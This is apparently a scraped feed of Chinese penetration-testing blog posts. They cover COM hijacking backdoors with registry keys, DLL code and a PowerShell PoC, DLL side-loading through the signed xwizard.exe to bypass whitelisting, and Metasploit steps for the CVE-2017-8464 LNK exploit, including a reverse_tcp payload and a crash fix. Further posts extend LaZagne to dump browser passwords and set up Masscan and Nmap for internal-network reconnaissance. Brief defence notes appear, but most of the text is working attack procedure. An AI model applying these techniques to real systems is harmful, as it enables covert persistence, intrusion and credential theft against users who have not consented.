HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E} 防御方法：1、使用应用程序白名单规则，禁止加载第三方dll 2、对注册表HKCU\Software\Classes\CLSID\的写入和修改操作进行记录并调查 更多关于COM对象劫持的资料可参考： https://attack.mitre.org/wiki/Technique/T1122 0x05 小结 本文介绍了两种利用COM劫持实现的后门方法，结合之前文章的两种利用方法，综合分析COM劫持的防御方法。特别值得注意的是，COM劫持后门能够绕过Autoruns对启动项的检测，实际防御时应该注意该细节。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator]]></title>
    <url>%2Fposts%2Face143ed.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Use CLR to maintain persistence》介绍了通过CLR劫持所有.Net程序的方法，无需管理员权限，可用作后门。美中不足的是通过WMI添加环境变量需要重启系统。本文将继续介绍另一种后门的利用方法，原理类似，但优点是不需要重启系统，同样也不需要管理员权限。 注： 本文介绍的方法曾被木马COMpfun使用 详细介绍地址： https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence 0x01 简介 本文将要介绍以下内容： 后门思路 POC编写 防御检测 0x02 COM组件 COM是Component Object Model （组件对象模型）的缩写 COM组件由DLL和EXE形式发布的可执行代码所组成 COM与语言，平台无关 COM组件对应注册表中CLSID下的注册表键值 0x03 后门思路 注： 思路来自于https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence 同使用CLR劫持.Net程序的方法类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例，所以，这就可以用作后门来使用，并且，该方法也能够绕过Autoruns对启动项的检测。 32位系统利用方法：1、新建文件 在%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入测试dll，重命名为api-ms-win-downlevel-[4char-random]-l1-1-0._dl 注： 测试dll下载地址：https://github.com/3gstudent/test/blob/master/calc.dll 重命名为api-ms-win-downlevel-1x86-l1-1-0._dl 如下图 2、修改注册表 注册表位置：HKCU\Software\Classes\CLSID\ 创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} 创建子项InprocServer32 Default的键值为测试dll的绝对路径： C:\Users\a\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl 创建键值： ThreadingModel REG_SZ Apartment 注册表内容如下图 3、测试 启动iexplore.exe，触发后门，多次启动calc.exe，最终导致系统死机 启动过程多次调用实例CAccPropServicesClass()，因此导致启动多个calc.exe，最终系统死机 4、优化 可以对dll加一个互斥量，防止重复加载，只启动一次calc.exe c++代码为： #pragma comment(linker,&quot;/OPT:nowin98&quot;) BOOL TestMutex() { HANDLE hMutex = CreateMutex(NULL, false, &quot;myself&quot;); if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle(hMutex); return 0; } return 1; } BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: if(TestMutex()==0) return TRUE; WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; }return TRUE; } 优化方法参照：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 编译后大小3k，如果多次加载该dll，会因为互斥量导致只加载一次，也就是说只启动一次calc.exe 编译好的dll下载地址： https://github.com/3gstudent/test/blob/master/calcmutex.dll 换用新的dll，再次测试，只启动一次calc.exe，如下图 64位系统利用方法：1、新建文件 在%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\下分别放入32位和64位的测试dll 32位dll下载地址： https://github.com/3gstudent/test/blob/master/calcmutex.dll 重命名为api-ms-win-downlevel-1x86-l1-1-0._dl 64位dll下载地址： https://github.com/3gstudent/test/blob/master/calcmutex_x64.dll 重命名为api-ms-win-downlevel-1x64-l1-1-0._dl 2、修改注册表 (1) 注册表位置：HKCU\Software\Classes\CLSID\ 创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} 创建子项InprocServer32 Default的键值为64位dll的绝对路径： C:\Users\a\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x64-l1-1-0._dl 创建键值： ThreadingModel REG_SZ Apartment 注册表内容如下图 (2) 注册表位置：HKCU\Software\Classes\Wow6432Node\CLSID\ 创建项{BCDE0395-E52F-467C-8E3D-C4579291692E} 创建子项InprocServer32 Default的键值为32位dll路径： C:\Users\a\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl 创建键值： ThreadingModel REG_SZ Apartment 注册表内容如下图 3、测试 分别启动32位和64位的iexplore.exe，均可触发后门，启动一次calc.exe 测试成功 注： {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass 参考链接: https://msdn.microsoft.com/en-us/library/accessibility.caccpropservicesclass(v=vs.110).aspx?cs-save-lang=1&amp;cs-lang=cpp#code-snippet-1 {BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator 参考链接: http://msdn.microsoft.com/en-us/library/windows/desktop/dd316556%28v=vs.85%29.aspx 0x04 POC编写 POC开发需要注意的细节： 1、操作默认不一定包含文件夹 需要先判断文件夹%APPDATA%\Microsoft\Installer\如果没有，在%APPDATA%\Microsoft\下创建文件夹Installer if((Test-Path %APPDATA%\Microsoft\Installer\) -eq 0) { Write-Host &quot;[+] Create Folder: $env:APPDATA\Microsoft\Installer\&quot; new-item -path $env:APPDATA\Microsoft\ -name Installer -type directory } 2、创建文件夹{BCDE0395-E52F-467C-8E3D-C4579291692E} 由于包含特殊字符{}，需要双引号包含路径 if((Test-Path &quot;%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}&quot;) -eq 0) { Write-Host &quot;[+] Create Folder: $env:APPDATA\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}&quot; new-item -path $env:APPDATA\Microsoft\Installer -name {BCDE0395-E52F-467C-8E3D-C4579291692E} -type directory } 3、创建payload文件 首先判断操作系统 if ([Environment]::Is64BitOperatingSystem) { Write-Host &quot;[+] OS: x64&quot; } else { Write-Host &quot;[+] OS: x86&quot; } 不同系统释放不同文件 释放文件依旧使用base64，可参考文章：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 4、创建注册表 修改注册表默认值，如下图 在powershell下，需要使用特殊变量&quot;(default)&quot; eg： $RegPath=&quot;HKCU:Software\Classes\CLSID\&quot; New-ItemProperty $RegPath&quot;{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32&quot; &quot;(default)&quot; -value $env:APPDATA&quot;\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl&quot; -propertyType string | Out-Null 完整POC已上传至Github，地址为：https://github.com/3gstudent/COM-Object-hijacking 0x05 防御检测 结合利用方法，注意监控以下位置： 1、注册表键值 HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\ HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E } 2、文件路径%APPDATA%\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\ 命名方式：api-ms-win-downlevel-[4char-random]-l1-1-0._dl 0x06 小结 本文介绍了通过COM Object hijacking实现的后门利用方法，使用powershell脚本编写POC，分享POC开发中需要注意的细节，结合实际利用过程分析该后门的防御方法。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use xwizard.exe to load dll]]></title>
    <url>%2Fposts%2Fa742ffe6.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章-method-to-load-dll/)介绍了利用Excel.Application object’s RegisterXLL()加载dll的技巧。本文继续，介绍最近学习到的一种更为通用的方法——利用xwizard.exe加载dll。该方法最大的特点是xwizard.exe自带微软签名，在某种程度上说，能够绕过应用程序白名单的拦截。 参考链接： http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/ 0x01 简介 本文将要介绍以下内容： xwizard.exe简介 利用思路 实际测试 0x02 xwizard.exe简介 应该为Extensible wizard的缩写，中文翻译可扩展的向导主机进程，暂时无法获得官方资料 支持Win7及以上操作系统 位于%windir%\system32\下 双击运行，弹出操作说明，如下图 支持参数如下： xwizard processXMLFile xwizard RunWizard xwizard RunPropertySheet 示例： xwizard processXMLFile 1.txt xwizard RunWizard /u {11111111-1111-1111-1111-111111111111} xwizard RunPropertySheet /u {11111111-1111-1111-1111-111111111111} 注： 参数中的GUID长度固定，否则弹框报错，如下图 0x03 利用思路 本节对Adam@Hexacorn的思路进行验证，文章地址： http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/ xwizard.exe的同级目录存在一个特别的文件xwizards.dll 使用IDA查看xwizards.dll的导出函数，如下图 我们可以看到，xwizards.dll的导出函数名称同xwizard.exe支持的参数名称十分接近 猜测xwizard.exe的功能是通过调用xwizards.dll实现的 使用IDA逆向xwizard.exe来验证我们的判断，如下图 对于函数LoadLibraryEx，由于未指定dll的绝对路径，使用相对路径，所以搜索顺序为： 进程当前目录 通过SetDllDirectory所设置的路径 Windows系统目录+PATH，即c:\windows\system32 16位系统目录，即c:\windows\system Windows目录，即c:\windows PATH环境变量中所列目录 也就是说，如果将xwizard.exe复制到另一任意目录，在该同级目录再保存一个自己编写的xwizards.dll，那么执行xwizard.exe时会优先调用同级目录的xwizards.dll，不再加载%windir%\system32\下的xwizards.dll 这就实现了利用xwizard.exe加载我们自己编写的dll 0x04 实际测试 测试系统： Win7 x86 1、复制xwizard.exe至新目录C:\x2、编写dll使用vc 6.0，新建dll工程，在case DLL_PROCESS_ATTACH下添加弹框代码 过程及优化方法不再赘述，可参考文章《Use Office to maintain persistence》 编译好的dll下载地址如下: https://github.com/3gstudent/test/blob/master/msg.dll 该dll成功加载后会弹框 3、测试直接执行xwizard.exe，没有弹出帮助对话框 使用Process Monitor监控系统，检查xwizard.exe是否正常执行 如下图 xwizard.exe正常执行，但是没有尝试加载xwizards.dll 再次测试，通过命令行执行，参数如下： xwizard processXMLFile 1.txt 查看Process Monitor输出结果 如下图 xwizard.exe首先尝试加载C:\x\xwizards.dll,加载失败后再尝试加载C:\windows\system32\xwizards.dll（再次印证了对dll加载顺序的判断） 接下来，将msg.dll重命名为xwizards.dll，保存在C:\x 命令行执行： xwizard processXMLFile 1.txt 成功加载C:\x\xwizards.dll，弹出对话框 如下图 测试成功 0x05 补充 64位系统： %windir%\system32\对应64位xwizard.exe，只能加载64位xwizards.dll 测试如下图 %windir%\SysWOW64\对应32位xwizard.exe，只能加载32位xwizards.dll 测试如下图 0x06 小结 本文介绍了利用xwizard.exe加载dll的技巧，特别的地方在于xwizard.exe包含微软签名，因此在某种程度上说，能够绕过应用程序白名单的拦截。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Lnk远程代码执行漏洞(CVE-2017-8464)利用测试]]></title>
    <url>%2Fposts%2Fc99c52ea.html</url>
    <content type="text"><![CDATA[0x00 前言 北京时间6月14日凌晨，微软发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。 该漏洞的原理同2010年据称美国和以色列入侵并破坏伊朗核设施的震网行动中所使用的震网病毒（Stuxnet）非常相似，所以也被一些人称为“震网三代”。 然而，通过百度搜索关键词“cve-2017-8464复现”找到的国内一些文章，对该漏洞的复现存在误解，错把通过快捷方式执行powershell代码当作了该漏洞的利用方法。 所以，本文将要纠正这个错误。 并且，目前可供测试的msf利用脚本存在一个bug，漏洞触发后进程explorer.exe崩溃，漏洞利用不够完美。 考虑到距补丁公开日期已经超过45天，所以本文将要公开利用脚本中bug的修复方法，实现该漏洞的“完美利用”。 0x01 简介 本文将要介绍以下内容： 漏洞简介 漏洞测试 bug修复 防御 0x02 漏洞简介 该漏洞是一个微软Windows系统处理LNK文件过程中发生的远程代码执行漏洞。当存在漏洞的电脑被插上存在病毒木马的U盘时，不需要任何额外操作，漏洞攻击程序就可以借此完全控制用户的电脑系统。该漏洞也可能籍由用户访问网络共享、从互联网下载、拷贝文件等操作被触发和利用攻击。 也就是说，漏洞可以在以下任一条件下触发： 1、系统开启U盘自动播放功能，插入U盘，漏洞触发2、通过网络共享访问该文件目录3、直接访问该文件目录 0x03 漏洞测试 目前公开渠道可供测试利用的脚本有如下两个： 1、msf利用脚本 作者：ykoster 下载地址：https://github.com/rapid7/metasploit-framework/pull/8767 2、python利用脚本 作者：nixawk 下载地址：https://github.com/nixawk/labs/blob/master/CVE-2017-8464/exploit_CVE-2017-8464.py 本文着重测试msf脚本，将exp拷贝至U盘，测试通过U盘触发漏洞的利用方法 实际测试：测试系统： kali 2.0 1、下载msf脚本 cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/ wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb 2、生成exp use exploits/windows/fileformat/cve_2017_8464_lnk_rce set payload windows/x64/exec set cmd calc.exe set EXITFUNC thread exploit 注： msf脚本默认对应系统Windows x64，所以payload也选择64位的exec 参数设置如下图 执行后，在/root/.msf4/local/生成24个利用文件，如下图 kali2.0下无法直接访问该文件夹，可通过命令行将/root/.msf4/local/下的所有文件复制到/root/1下 命令如下： cp -r /root/.msf4/local/ /root/1 复制文件，如下图 将以上文件复制到U盘，在另一未打补丁的Win7 x64系统测试 3、测试 成功执行calc.exe，但是进程explorer.exe崩溃 如下图 注： U盘内的利用脚本可通过格式化U盘删除 接着又分别做了如下测试： 测试Win10 x64 更换payload： set payload windows/x64/meterpreter/reverse_tcp 依旧是同样的结果 查看github，其他人也遇到了同样的问题，如下图 更多回复见：https://github.com/rapid7/metasploit-framework/pull/8767 4、更多测试 尝试测试32位系统 该脚本支持32位系统，切换命令如下： set target 1 set payload windows/exec 如下图 但是测试结果不尽人意，依旧失败 0x04 bug修复 省略调试过程，直接给出一种最简单的解决方法：更换dll msf利用脚本共生成24个文件，分别为1个dll文件和23个lnk文件 如下图 注： 对于23个lnk文件，文件名最后一位代表U盘盘符，如果测试系统U盘为E盘，那么只留下文件名最后一位为”E”的lnk文件就好，其他lnk文件可以删除 bug产生的原因在于dll，将其换成自己的dll就好 32位可供测试的dll下载地址： https://github.com/3gstudent/test/blob/master/calc.dll 64位可供测试的dll下载地址： https://github.com/3gstudent/test/blob/master/calc_x64.dll 不会导致进程explorer.exe崩溃，测试如下图 插入U盘自动播放触发漏洞的测试如下图 至此，bug成功修复 测试EXP地址： https://github.com/3gstudent/CVE-2017-8464-EXP 0x05 防御 1、安装补丁微软官方补丁下载地址： https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8464 360漏洞补丁修复工具下载地址： http://b.360.cn/other/stuxnet3fixtool 2、关闭U盘自动播放功能0x06 小结 本文对CVE-2017-8464的msf利用脚本进行测试，修复其中的bug，在技术层面上，实现对该漏洞的“完美利用”，请勿用于非法用途，在此再次提醒普通用户勤打补丁的必要。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[本地密码查看工具LaZagne中的自定义脚本开发]]></title>
    <url>%2Fposts%2Ff4aba070.html</url>
    <content type="text"><![CDATA[0x00 前言 LaZagne是一款用于检索大量存储在本地计算机密码的开源应用程序。因为每个软件储存密码的方式不尽相同（明文、API、定制算法、数据库等），所以该工具使用多种方法获取软件密码，目前支持的软件如下图 该工具通过python开发，易读、易维护，所以本文就尝试对其扩展，编写python脚本实现对360极速浏览器的密码导出，并且介绍脚本开发过程的细节。 0x01 简介 本文将要介绍以下内容： 解决LaZagne中的bug 开发脚本导出360极速浏览器密码 使用py2exe将python脚本转成exe 使用PyInstaller将python脚本转成exe 0x02 LaZagne中的bug LaZagne下载地址： https://github.com/AlessandroZ/LaZagne python版本：2.7 下载后执行\LaZagne-master\LaZagne-master\Windows\laZagne.py 报错，缺少第三方扩展包pyasn1和psutil 安装第三方扩展包： C:\Python27\Scripts\easy_install.exe pyasn1 C:\Python27\Scripts\easy_install.exe psutil 再次执行\LaZagne-master\LaZagne-master\Windows\laZagne.py 仍然报错，提示如下： ImportError: No module named memorpy 经过搜索，并没有第三方扩展包memorpy，猜测是输入错误，正确的应该为memory_profiler 安装扩展包memory_profiler： C:\Python27\Scripts\easy_install.exe memory_profiler 并且修改源文件： 路径为\LaZagne-master\LaZagne-master\Windows\lazagne\softwares\memory\memorydump.py Line14：from memorpy import * 修改为 from memory_profiler import * 成功执行laZagne.py，如下图 注： 改成memory_profiler后虽然成功编译，但是运行memory模块时会报错，提示Process没有list方法(bug发现和修改方法来自于@burnegg) 修改思路： 改回memorpy 安装： C:\Python27\Scripts\pip.exe install https://github.com/n1nj4sec/memorpy/archive/master.zip 0x03 开发脚本导出360极速浏览器密码 原工程提示开发自定义脚本可参考： https://github.com/AlessandroZ/LaZagne/wiki 但是该网页并没有提示信息，经过分析代码结构，得出以下修改方法 360极速浏览器： 360极速浏览器使用chrome内核，猜测存储密码的功能同Chrome相近，因此使用360极速浏览器作为测试对象 360极速浏览器提供密码保存功能，如下图 经测试发现： Chrome保存密码的文件路径为： C:\Users\1\Local Settings\Application Data\Google\Chrome\User Data\ C:\Users\1\AppData\Local\Google\Chrome\User Data\ 360极速浏览器保存密码的文件路径为： C:\Users\1\Local Settings\Application Data\360Chrome\Chrome\User Data\ C:\Users\1\AppData\Local\360Chrome\Chrome\User Data\ 经过对比，二者的差别仅在文件名存在差异，数据结构相同 添加360极速浏览器密码导出功能：1、修改\LaZagne-master\Windows\lazagne\config\manageModules.py (1)Line6添加如下代码： from lazagne.softwares.browsers.cse import CSE 如下图 注： lazagne.softwares.browsers.cse表示文件名 import CSE表示类名为CSE (2)Line6添加如下代码： CSE(), 注： 添加moduleNames，对应类名CSE 如下图 详细代码可参照： https://github.com/3gstudent/LaZagne/blob/master/Windows/lazagne/config/manageModules.py 2、在\LaZagne-master\Windows\lazagne\softwares\browsers新建文件cse.py 文件内容参照同级目录的chrome.py，如下位置作修改即可： (1)Line10修改为class CSE(ModuleInfo): 注： 设置类名 (2) Line12修改为options = {&#39;command&#39;: &#39;-360cse&#39;, &#39;action&#39;: &#39;store_true&#39;, &#39;dest&#39;: &#39;360CSE&#39;, &#39;help&#39;: &#39;cse&#39;} 注： ‘command’不能同chrome的-c重复 ‘dest’表示显示导出浏览器密码的标题 (3) Line22修改为360路径\Local Settings\Application Data\360Chrome\Chrome\User Data\ Line23修改为360路径\AppData\Local\360Chrome\Chrome\User Data\ 完整代码如下： homedrive + homepath + &#39;\\Local Settings\\Application Data\\360Chrome\\Chrome\\User Data&#39;, homedrive + homepath + &#39;\\AppData\\Local\\360Chrome\\Chrome\\User Data&#39;, (4)其他提示信息将chrome换成360cse就好 详细代码可参照： https://github.com/3gstudent/LaZagne/blob/master/Windows/lazagne/softwares/browsers/cse.py 保存文件，再次执行laZagne.exe 成功导出360极速浏览器保存的密码，如下图 0x04 使用py2exe将python脚本转成exe LaZagne提供了编译好的Windows版本，下载地址如下： https://github.com/AlessandroZ/LaZagne/releases/ 但是如果想扩展功能，例如添加导出360极速浏览器密码的功能，就需要找到自己编译的方法 使用py2exe的方法如下： 1、下载py2exe 地址如下： https://sourceforge.net/projects/py2exe/ 2、新建mysetup.py 内容如下： # mysetup.py from distutils.core import setup import py2exe setup(console=[&quot;laZagne.py&quot;]) 保存在LaZagne-master\LaZagne-master\Windows\下，即laZagne.py的同级目录 3、生成 cmd执行： C:\Python27\python.exe mysetup.py py2exe 4、测试 执行laZagne.exe 提示ImportError: No module named pyasn1 解决方法： 在C:\Python27\Lib\site-packages找到文件pyasn1-0.2.3-py2.7.egg 将其解压缩，在同级目录生成文件夹pyasn1 使用py2exe重新编译： C:\Python27\python.exe mysetup.py py2exe 生成dist文件夹，再次执行laZagne.exe，成功，如下图 0x05 使用PyInstaller将python脚本转成exe 1、安装PyInstaller 方法1： 使用pip安装 安装pywin32，下载地址： https://sourceforge.net/projects/pywin32/files/pywin32/ 使用pip安装： pip install pyinstaller 报错，如下图 方法2： 下载源码安装 源码下载地址： http://www.pyinstaller.org/downloads.html 测试使用的版本为PyInstaller-3.2.1 解压缩后进入其子目录bootloader： cd bootloader 编译： python ./waf configure build install 重新进入根目录： cd .. 安装pyinstaller： python setup.py install 安装成功，如下图 2、打包exe 参数如下： C:\Python27\Scripts\pyinstaller-script.py -F C:\LaZagne-master\LaZagne-master\Windows\laZagne.py 注： -F参数表示打包成单个exe 在C:\Python27\Scripts\下生成dist文件夹，里面包含生成的laZagne.exe 测试系统(未安装Python)执行laZagne.exe 成功运行，如下图 0x06 小结 本文介绍了使用python编写LaZagne扩展脚本的方法，实现了导出360极速浏览器的用户密码。针对不同的软件，使用LaZagne定制脚本导出密码无疑是一个十分高效的方式。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows平台运行Masscan和Nmap]]></title>
    <url>%2Fposts%2Fb89d38e6.html</url>
    <content type="text"><![CDATA[0x00 前言 在内网渗透中，信息搜集尤为重要。面对内网的复杂环境，虽说网络扫描容易暴露自己，但通过扫描可以发现内网的存活主机、开放端口，运行服务、操作系统等信息，为进一步渗透奠定基础。扫描工具的选取，不仅要考虑功能，更要考虑工具的适用性。现实中的跳板通常并不是一台Linux服务器，没有合适的环境安装Nmap、Zmap和Masscan。换句话说，可在Windows下直接使用的命令行扫描工具有哪些呢？知名的开源扫描工具Nmap、Zmap和Masscan，三款工具在功能上各有特色。在适用性上，Zmap在Windows下使用需要安装Cygwin，因此不在考虑范围内。Masscan支持Windows平台的编译，Nmap提供命令行版本，看起来Masscan和Nmap符合要求。但是，Masscan和Nmap的使用均需要WinPcap的支持，也就是说，使用前均需要安装WinPcap。那么，能否通过命令行安装WinPcap呢？ 0x01 简介 本文将要要解决以上问题，介绍内容如下： Windows平台编译Masscan Windows命令行安装WinPcap Masscan使用介绍 Nmap配置和使用介绍 0x02 Windows平台编译Masscan Masscan下载地址： https://github.com/robertdavidgraham/masscan/ 编译工具：vs2012 编译选项中未添加vs2012的编译配置，所以直接编译会报错 解决方法： 在string_s.h中添加vs2012配置信息 位于misc-string_s.h,添加代码如下： #if defined(_MSC_VER) &amp;&amp; (_MSC_VER == 1700) /*Visual Studio 2012*/ # include &lt;stdio.h&gt; # include &lt;string.h&gt; # define strcasecmp _stricmp # define memcasecmp _memicmp # ifndef PRIu64 # define PRIu64 &quot;llu&quot; # define PRId64 &quot;lld&quot; # define PRIx64 &quot;llx&quot; # endif 编译成功，执行masscan.exe，提示Packet.dll: not found 如下图 Packet.dll获取方法： 安装WinPcap后在System32下获得 WinPcap下载地址： https://www.winpcap.org/install/default.htm 在另一系统安装WinPcap，在System32下找到Packet.dll和Wpcap.dll，复制到测试系统下masscan.exe的同级目录，再次运行 程序正常启动，但是无法扫描，报错如下： FAIL: Error opening adapter: 系统找不到指定的设备。 (20) adapter[\Device\NPF_{71D19B82-0818-4685-A8E7-A6C7C812F2EA}].init: failed 疑问：测试系统也需要安装WinPcap才能使用？ 经实际测试，确实如此 0x03 Windows命令行安装WinPcap 测试32位系统：使用ProcessMonitor监控WinPcap安装过程（32位系统），获得如下信息： 在\system32\文件夹下释放packet.dll和wpcap.dll 在\system32\drivers\释放npf.sys 安装服务npf 通过sc命令获得安装服务npf的配置信息： sc qc npf 获取信息如下： [SC] QueryServiceConfig 成功 SERVICE_NAME: npf TYPE : 1 KERNEL_DRIVER START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : system32\drivers\npf.sys LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : NetGroup Packet Filter Driver DEPENDENCIES : SERVICE_START_NAME : 如下图 查看运行状态： sc query npf 获取信息如下： SERVICE_NAME: npf TYPE : 1 KERNEL_DRIVER STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 如下图 对应的注册表会创建键值，表示服务配置信息，位置如下： HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\npf HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\npf 如下图 如下图 猜测，只要能够模拟上述安装操作,就能够实现WinPcap在命令行下的安装 模拟安装操作如下： 1、释放文件 copy packet.dll %SystemRoot%\system32\ copy wpcap.dll %SystemRoot%\system32\ copy npf.sys %SystemRoot%\system32\drivers\ 2、创建服务 sc create npf binPath= system32\drivers\npf.sys type= kernel start= demand error= normal tag= no DisplayName= &quot;NetGroup Packet Filter Driver&quot; 3、启动服务 sc start npf 测试命令如下： masscan.exe -p80 192.168.81.143 成功执行masscan.exe，如下图 测试64位系统：使用ProcessMonitor监控WinPcap安装过程（32位系统），获得如下信息： 在\system32\文件夹下释放64位packet.dll和wpcap.dll 在\system32\drivers\释放64位npf.sys 在\syswow64\文件夹下释放32位packet.dll、wpcap.dll和pthreadVC.dll 安装服务npf 经实际测试和优化，在64位环境下执行32位的masscan.exe，不需要64位的packet.dll和wpcap.dll，不需要32位的pthreadVC.dll，仅需要安装64位驱动npf.sys 并且，无论是32位还是64位系统，packet.dll和wpcap.dll放在masscan.exe同级目录即可（当然，由于是vs2012编译，还需要msvcr110d.dll） 也就是说，针对32位和64位系统，只需要向\system32\drivers\文件夹复制不同版本的npf.sys即可 接着创建服务npf并安装，整个流程结束 将以上过程通过批处理自动实现，一键安装脚本代码如下： @echo off cd %~dp0 if &quot;%PROCESSOR_ARCHITECTURE%&quot;==&quot;x86&quot; move npf_x86.sys %SystemRoot%\system32\drivers\npf.sys if &quot;%PROCESSOR_ARCHITECTURE%&quot;==&quot;AMD64&quot; move npf_x64.sys %SystemRoot%\system32\drivers\npf.sys if exist %SystemRoot%\system32\drivers\npf.sys (echo move success!) else (echo move error!) sc create npf binPath= system32\drivers\npf.sys type= kernel start= demand error= normal tag= no DisplayName= &quot;NetGroup Packet Filter Driver&quot; sc start npf 相关代码和所需dll文件已上传至github，地址如下： https://github.com/3gstudent/Winpcap_Install 0x04 Masscan使用介绍 扫描指定网段和端口： masscan.exe -p80 192.168.81.1/24 找到一台开启80端口的服务器，回显如下： Discovered open port 80/tcp on 192.168.81.143 扫描指定主机所有开放的端口： masscan.exe -p0-65535 192.168.81.143 如下图 扫描指定主机的特定端口： masscan.exe -p80,443 192.168.81.143 获取banner： masscan.exe -p80,443,3306 192.168.81.143 --banners 通过配置文件启动扫描： 将配置信息保存在1.conf: masscan.exe -p80,443,3306 192.168.81.143 --banners --echo&gt;1.conf 读取配置信息1.conf，启动扫描: masscan.exe -c 1.conf 修改扫描速度为100,000包/秒（Windos下最大为 300,000包/秒），默认100包/秒： --rate 100000 输出格式： -oX &lt;filespec&gt; (XML) -oB &lt;filespec&gt; (Binary) -oG &lt;filespec&gt; (Grep) -oJ &lt;filespec&gt; (Json) -oL &lt;filespec&gt; (List) -oU &lt;filespec&gt; (Unicornscan format) 补充，默认情况，masscan开启如下配置： -sS: this does SYN scan only (currently, will change in the future) -Pn: doesn&#39;t ping hosts first, which is fundamental to the async operation -n: no DNS resolution happens --randomize-hosts: scan completely randomized --send-eth: sends using raw libpcap 0x05 Nmap配置和使用介绍 NmapZip版下载地址： https://nmap.org/dist/nmap-7.50-win32.zip 使用Nmap也要在命令行提前安装WinPcap 还要添加vs2013的dll：msvcp120.dll和msvcr120.dll(Nmap.exe通过vs2013编译) 去掉不相关文件，精简nmap,最终需要的支持文件列表如下： libeay32.dll msvcp120.dll msvcr120.dll nmap-mac-prefixes nmap-os-db nmap-payloads nmap-services nmap.exe ssleay32.dll 扫描指定网段和端口： nmap.exe -p80 192.168.81.1-255 或者 nmap.exe -p80 192.168.81.1/24 扫描IP地址列表： nmap.exe iL IP.txt 扫描指定主机所有开放的端口： nmap.exe 192.168.81.143 扫描指定主机的特定端口： nmap.exe -p80,443 192.168.81.143 操作系统探测(-O)： nmap.exe -O 192.168.81.143 端口上运行的服务版本探测(-sV)： nmap.exe -sV 192.168.81.143 端口扫描如下图 版本检测如下图 通过对比可知版本检测能够识别端口上的服务版本 注： 恢复版本检测(-sV)需要添加以下文件： nse_main.lua nmap-service-probes nselib文件夹及文件夹内的文件 scripts文件夹及文件夹内的文件 路由信息探测(–traceroute) nmap.exe --traceroute 192.168.81.143 综合探测（-A） 包括操作系统、服务版本和路由信息，也就是以上三者的集合 nmap.exe -A 192.168.81.143 扫描方式支持如下参数： -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags &lt;flags&gt;: Customize TCP scan flags -sI &lt;zombie host[:probeport]&gt;: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b &lt;FTP relay host&gt;: FTP bounce scan 常用扫描方式介绍：TCP SYN Scan(-sS) 半开放扫描(half-open scanning)，没有建立三次握手连接，速度很快 nmap默认扫描方式 